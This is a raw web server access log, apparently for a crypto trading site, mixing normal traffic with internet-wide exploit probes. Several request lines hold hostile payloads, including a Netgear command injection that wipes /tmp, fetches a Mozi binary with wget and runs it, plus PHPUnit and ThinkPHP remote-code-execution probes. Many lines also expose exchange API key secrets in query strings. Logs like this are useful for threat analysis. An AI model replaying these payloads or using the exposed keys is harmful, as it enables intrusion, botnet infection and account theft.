129.146.133.174 - - [22/Nov/2020:11:26:51 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
94.183.179.145 - - [22/Nov/2020:11:52:50 +0000] "GET / HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
220.132.181.99 - - [22/Nov/2020:12:01:28 +0000] "GET / HTTP/1.1" 404 162 "-" "Mozilla/5.0"
101.16.59.43 - - [22/Nov/2020:12:19:03 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 162 "-" "Ankit"
101.16.59.43 - - [22/Nov/2020:12:19:03 +0000] "moteSubmit=Save" 400 166 "-" "-"
66.249.66.212 - - [22/Nov/2020:12:25:37 +0000] "GET /robots.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.153 - - [22/Nov/2020:12:25:37 +0000] "GET /robots.txt HTTP/1.1" 404 23 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.66.212 - - [22/Nov/2020:12:25:37 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.0.34.96 - - [22/Nov/2020:12:46:19 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
37.120.193.243 - - [22/Nov/2020:12:54:19 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 101196834 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:12:57:25 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 2481381 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
83.97.20.29 - - [22/Nov/2020:13:01:54 +0000] "GET / HTTP/1.0" 404 162 "-" "-"
192.241.234.13 - - [22/Nov/2020:13:17:38 +0000] "GET / HTTP/1.1" 200 2154 "-" "Mozilla/5.0 zgrab/0.x"
46.246.122.110 - - [22/Nov/2020:13:30:24 +0000] "GET /ws/?symbols=XBTUSD&testnet=false&apiKeyID=Mk6AeWsPY6Bvam-50kGDqLpd&apiKeySecret=RZwYzUmkBP03Q6kEmb4axsVbHOW9oTOIZtHrEZIXrrPF_edj HTTP/1.1" 101 304838031 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
46.246.122.110 - - [22/Nov/2020:13:30:28 +0000] "GET /ws/?symbols=XBTUSD&testnet=false&apiKeyID=Mk6AeWsPY6Bvam-50kGDqLpd&apiKeySecret=RZwYzUmkBP03Q6kEmb4axsVbHOW9oTOIZtHrEZIXrrPF_edj HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
46.246.122.110 - - [22/Nov/2020:13:30:30 +0000] "GET /ws/?symbols=XBTUSD&testnet=false&apiKeyID=Mk6AeWsPY6Bvam-50kGDqLpd&apiKeySecret=RZwYzUmkBP03Q6kEmb4axsVbHOW9oTOIZtHrEZIXrrPF_edj HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
46.246.122.110 - - [22/Nov/2020:13:30:32 +0000] "GET /ws/?symbols=XBTUSD&testnet=false&apiKeyID=Mk6AeWsPY6Bvam-50kGDqLpd&apiKeySecret=RZwYzUmkBP03Q6kEmb4axsVbHOW9oTOIZtHrEZIXrrPF_edj HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
46.246.122.110 - - [22/Nov/2020:13:30:34 +0000] "GET /ws/?symbols=XBTUSD&testnet=false&apiKeyID=Mk6AeWsPY6Bvam-50kGDqLpd&apiKeySecret=RZwYzUmkBP03Q6kEmb4axsVbHOW9oTOIZtHrEZIXrrPF_edj HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
73.255.217.90 - - [22/Nov/2020:13:31:23 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:13:31:24 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6745 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:13:31:24 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:13:31:54 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 170238 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
181.143.101.194 - - [22/Nov/2020:13:47:28 +0000] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 162 "-" "Hello, World"
181.143.101.194 - - [22/Nov/2020:13:47:28 +0000] "" 400 0 "-" "-"
192.241.217.10 - - [22/Nov/2020:13:48:30 +0000] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 23 "-" "Mozilla/5.0 zgrab/0.x"
144.91.117.206 - - [22/Nov/2020:13:49:27 +0000] "GET / HTTP/1.1" 404 162 "-" "Java/1.8.0_131"
144.91.117.206 - - [22/Nov/2020:13:49:27 +0000] "GET / HTTP/1.1" 404 162 "-" "Java/1.8.0_131"
144.91.117.206 - - [22/Nov/2020:13:49:27 +0000] "GET /api HTTP/1.1" 404 162 "-" "Java/1.8.0_131"
73.255.217.90 - - [22/Nov/2020:14:22:01 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:14:22:02 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6691 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:14:22:02 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:14:22:23 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 155861 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:14:22:53 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21%2CETHUSD%2CETHZ20%2CETHUSDZ20&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 538630 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:14:26:47 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21%2CETHUSD%2CETHUSDZ20&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 2742418 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
162.142.125.40 - - [22/Nov/2020:14:42:55 +0000] "GET / HTTP/1.1" 404 162 "-" "-"
162.142.125.40 - - [22/Nov/2020:14:42:55 +0000] "GET / HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
91.241.19.84 - - [22/Nov/2020:14:47:38 +0000] "GET /console/ HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:14:47:42 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:14:47:43 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:14:47:43 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:14:47:46 +0000] "POST /mifs/.;/services/LogService HTTP/1.1" 404 23 "https://206.189.16.174:443" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:14:47:46 +0000] "GET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:14:47:48 +0000] "POST /api/jsonws/invoke HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
91.241.19.84 - - [22/Nov/2020:14:47:48 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 2154 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
73.255.217.90 - - [22/Nov/2020:14:51:32 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:14:51:32 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6646 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:14:51:32 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:14:51:43 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21%2CETHUSD%2CETHUSDZ20&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 76910 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:14:52:23 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 257426 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
64.31.8.10 - - [22/Nov/2020:14:57:06 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 162 "http://206.189.16.174:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
64.31.8.10 - - [22/Nov/2020:14:57:06 +0000] "" 400 0 "-" "-"
46.246.122.110 - - [22/Nov/2020:15:10:07 +0000] "GET /ws/?symbols=XBTUSD&testnet=false&apiKeyID=Mk6AeWsPY6Bvam-50kGDqLpd&apiKeySecret=RZwYzUmkBP03Q6kEmb4axsVbHOW9oTOIZtHrEZIXrrPF_edj HTTP/1.1" 101 28188276 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
13.66.139.126 - - [22/Nov/2020:15:18:39 +0000] "GET / HTTP/1.1" 200 2154 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
163.172.148.199 - - [22/Nov/2020:15:33:08 +0000] "GET / HTTP/1.1" 200 2154 "-" "-"
173.48.155.234 - - [22/Nov/2020:15:38:06 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:15:38:06 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6663 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:15:38:06 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:15:38:11 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 94389 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:16:16:02 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:16:16:02 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6648 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:16:16:02 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:16:18:27 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 2060199 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
37.120.193.246 - - [22/Nov/2020:16:19:41 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
37.120.193.246 - - [22/Nov/2020:16:19:42 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
37.120.193.246 - - [22/Nov/2020:16:19:42 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6691 "https://www.bogmex.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
173.48.155.234 - - [22/Nov/2020:16:23:19 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 3021330 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:16:26:32 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 3193814 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
37.120.193.246 - - [22/Nov/2020:16:31:14 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 6355861 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
61.219.11.153 - - [22/Nov/2020:16:32:40 +0000] "\x01\x02\x03\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 166 "-" "-"
173.48.155.234 - - [22/Nov/2020:16:33:28 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 2303801 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:16:36:03 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 822091 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
37.120.193.249 - - [22/Nov/2020:16:42:51 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 3611311 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
173.48.155.234 - - [22/Nov/2020:16:43:51 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CETHUSD%2CETHZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 600025 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
173.48.155.234 - - [22/Nov/2020:16:45:21 +0000] "GET /api/v1/apiKey HTTP/1.1" 304 0 "https://www.bogmex.com/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
173.48.155.234 - - [22/Nov/2020:16:45:22 +0000] "GET /favicon.png HTTP/1.1" 200 144936 "https://www.bogmex.com/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
173.48.155.234 - - [22/Nov/2020:16:45:22 +0000] "GET /api/v1/instrument/active HTTP/1.1" 200 6697 "https://www.bogmex.com/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
173.48.155.234 - - [22/Nov/2020:16:45:22 +0000] "GET /manifest.json HTTP/1.1" 200 344 "https://www.bogmex.com/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
173.48.155.234 - - [22/Nov/2020:16:45:22 +0000] "GET /favicon.png HTTP/1.1" 200 144920 "https://www.bogmex.com/index.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
173.48.155.234 - - [22/Nov/2020:16:45:24 +0000] "GET /service-worker.js HTTP/1.1" 200 1193 "https://www.bogmex.com/service-worker.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
173.48.155.234 - - [22/Nov/2020:16:45:24 +0000] "GET /precache-manifest.138cd5ad2f7791e80f92c63be9b35a78.js HTTP/1.1" 200 3602 "https://www.bogmex.com/service-worker.js" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
173.48.155.234 - - [22/Nov/2020:16:45:35 +0000] "GET /ws/?symbols=XBTUSD%2CETHUSD%2CXBTZ20%2CXBTH21%2CETHUSDZ20%2CETHZ20&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 176980 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
45.141.59.138 - - [22/Nov/2020:16:46:46 +0000] "GET / HTTP/1.1" 200 2154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
73.255.217.90 - - [22/Nov/2020:16:52:08 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 5802085 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
73.255.217.90 - - [22/Nov/2020:17:23:59 +0000] "GET /ws/?symbols=XBTUSD%2CXBTZ20%2CXBTH21&testnet=false&apiKeyID=ydVmW5XXZn8-aVXNN06hggvY&apiKeySecret=yrIIMpgqw-LH1jN444m6AUwq300r7h7oBUPHFPS1fGOkQCo0 HTTP/1.1" 101 20765403 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15"
107.77.225.131 - - [22/Nov/2020:17:26:46 +0000] "GET /api/v1/apiKey HTTP/1.1" 200 291 "https://www.bogmex.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
